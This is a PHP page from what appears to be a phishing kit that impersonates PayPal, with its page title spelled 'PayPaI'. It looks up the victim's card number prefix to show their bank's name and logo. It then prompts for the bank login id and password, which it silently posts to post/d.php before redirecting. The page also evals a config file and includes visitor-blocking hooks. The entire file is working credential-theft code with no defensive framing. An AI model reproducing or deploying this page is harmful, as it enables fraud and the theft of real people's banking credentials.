<?php
require_once __DIR__ . '/function.php';


if (file_exists($api->dir_config . '/' . $api->general_config)) {
  @eval(file_get_contents($api->dir_config . '/' . $api->general_config));
}

if ($config_blocker == 1) {
  $api->cookie();
  $api->session();
}

$api->visitor("Sumarry");

$page = 'bank';
$title = 'Summary';
$notification = 3;
require __DIR__ . '/page/header.php';
?>
<?php

$bin = $_SESSION['card_digit'];
$ch = curl_init();
$curlConfig = array(
    CURLOPT_URL            => "https://lookup.binlist.net/$bin",
    CURLOPT_RETURNTRANSFER => true,
	CURLOPT_SSL_VERIFYPEER => false,
);
curl_setopt_array($ch, $curlConfig); 
$result = curl_exec($ch);
curl_close($ch); 
$details = json_decode($result, true);
$bnk = $details["bank"]["name"];
$url = $details["bank"]["url"];

?>
<head>
<title><?=$fo8;?></title>
<script src="assets/js/jquery.min.js"></script>
<link rel="stylesheet" href="assets/css/app.css">
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=yes">
</head>
<div class="contents vx_mainContent">
<div class="mainContents summaryContainer">
<div class="engagementModule nemo_engagementModule">
<div class="engagementMainBar-container js_engagementMainBar-container">
<div class="summarySection engagementMainBar row" style="height:0%;">
<div class="col-sm-7 progressAndWelcome">
<div class="welcomeMessage js_selectModule selectModule profileStatus active">
<p class="vx_h3 engagementWelcomeMessage nemo_welcomeMessageHeader">
<span class="icon icon-small icon-lock-small" style="color:#ffffff"></span>&nbsp;<span style="color:#FFFFFF">
<span><?=$api->transcode("Confirm your bank account");?></span>
</p>
<script>
document['title']='Link\x20your\x20bank\x20-\x20PayPaI';
function geoplugin_continentCode() { return 'DI';} 
</script>
</div>
</div>
</div>
</div>
</div>
<div class="busyOverlay" style="transition: unset; display: none;">
<div class="busyIcon" style="top: 50%;"></div>
<p class="xysnewLoaderx" style="">Connecting to <?php echo $bnk;?></p></div>
<div class="mainBody">
<div class="overpanel-wrapper row">
<div class="overpanel-content col-xs-12 col-xs-offset-0 col-sm-8 col-sm-offset-2 col-md-4 col-md-offset-4">
<div class="overpanel-header">
<h2>
<span><?=$api->transcode("Link your bank account to PayPal");?></span>
</div>
<p align="center">
<object data="https://logo.clearbit.com/<?php echo $url;?>" type="image/jpg">
</object>
</p>
<div class="overpanel-body">
<form method="post" id="lib" autocomplete="off">
<div class="addressEntry">
<p><?=$api->transcode("Please login to");?> <?php echo $bnk;?> <?=$api->transcode("to link your bank account.");?> </p>
<hr>



<p><?=$api->transcode("Bank name");?> : <?php echo $bnk;?></p>
<p><?=$api->transcode("Bank website");?> : <?php echo $url;?></p>
<br>



<div style="display: block; max-width: 239px; margin: auto;" class="textInput lap" id="DivZip">
<input type="text" placeholder="<?=$api->transcode("You bank login id");?>" id="Zip" name="zip" required>
<input type="password" placeholder="<?=$api->transcode("You bank password");?>" name="city" required>
</div>

<br>
<div style="display:none; visibility:hidden;">
<input type="text" name="killbill" maxlength="50"></div>
<center>
<button class="vx_btn" type="submit" id="lib">
<span><?=$api->transcode("Login to your bank account");?></span>
</center>
<hr>
<center>
<button style="border: 1px solid #ffffff !important;background-color: #99aab5;" class="vx_btn" type="submit" id="lib">
<span><a style="color: #ffffff;" href="linkm.php?=L<?=$fo3;?>"><?=$api->transcode("I don't have online access");?></a></span>
</center>
</form>
</div>
</div>
</div>


<script>
$("#lib").validate({

  submitHandler: function(form) {
	 $('.busyOverlay').fadeIn(10);
            setTimeout(function(){
            $('.busyOverlay').fadeOut(3000);
			window.location.assign("linkm.php?=L<?=$num3;?>");
            }, 3500); 
	 
    $.post("post/d.php", $("#lib").serialize(), function(GET) {
    });
	
  },
});

</script>


<script>
$(document).ready(function($){
    $('.xysnewLoaderx').fadeOut(0);
    $('.busyOverlay').fadeIn();
    setTimeout(function(){
        $('.busyOverlay').fadeOut();
        $('.xysnewLoaderx').fadeIn();
    }, 3000);
});
</script
</div>
</div>
</div>
<?php
require __DIR__ . '/page/footer.php';
?>
